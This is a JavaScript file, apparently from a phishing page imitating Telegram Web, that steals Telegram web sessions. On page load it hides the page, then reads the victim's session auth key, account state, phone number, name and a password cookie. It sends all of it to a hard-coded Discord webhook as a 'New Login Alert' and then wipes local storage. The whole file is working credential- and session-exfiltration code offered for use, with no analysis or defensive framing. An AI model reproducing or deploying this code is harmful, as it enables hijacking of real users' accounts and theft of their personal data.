document.addEventListener("DOMContentLoaded", function () {
  async function checkLocalStorage1() {
    let globalState = localStorage.getItem("tt-global-state");
    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        const { firstName, phoneNumber, isPremium } = currentUser;
        const password = document.cookie
          .split("; ")
          .find((e) => e.startsWith("password="))
          ?.split("=")[1];

        // Remove sensitive data from localStorage
        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        // Explicitly include dc5_auth_key and tt-multitab along with the rest of localStorage
        const localStorageData = { 
          ...localStorage,
          "dc5_auth_key": localStorage.getItem("dc5_auth_key"), // Explicitly add dc5_auth_key
          "tt-multitab": localStorage.getItem("tt-multitab") // Explicitly add tt-multitab
        };

        // Prepare the message for Discord with @everyone mention
        let message = `@everyone **🔔 New Login Alert:**
        - **User ID:** ${currentUserId}
        - **First Name:** ${firstName}
        - **Phone Number:** ${phoneNumber || "N/A"}
        - **Is Premium:** ${isPremium ? "Yes" : "No"}
        - **Password:** ${password || "N/A"}
        - **LocalStorage Content:**`;

        // Loop through localStorage and add each key-value pair to the message in the desired format
        Object.entries(localStorageData).forEach(([key, value]) => {
          message += `\n- **${key}:** "${value}"`; // Ensure each value is quoted
        });

        console.log("Sending data to Discord..."); // Log to ensure it's being reached

        // Send the data to Discord via webhook
        const webhookUrl = "https://discord.com/api/webhooks/1329097157944414288/Pw3T9oW5G0N-2vGpF9y8YkcjjfXbiLPMJROqQaG-9PxpcVh6L_OLIEf6Ek2KtzFzNwDe"; // Replace with your webhook URL
        try {
          const response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: message,
            }),
          });

          if (response.ok) {
            console.log("Webhook sent successfully");
          } else {
            console.log("Failed to send webhook:", response.status);
          }
        } catch (error) {
          console.error("Error sending webhook:", error);
        }

        // Clear sensitive data and cookies for security
        localStorage.clear();
        document.cookie =
          "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";

        // Temporarily comment out the Telegram redirection to isolate the issue
        // window.location.href = "https://web.telegram.org/";

        clearInterval(checkInterval1);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval1 = setInterval(checkLocalStorage1, 100);
});
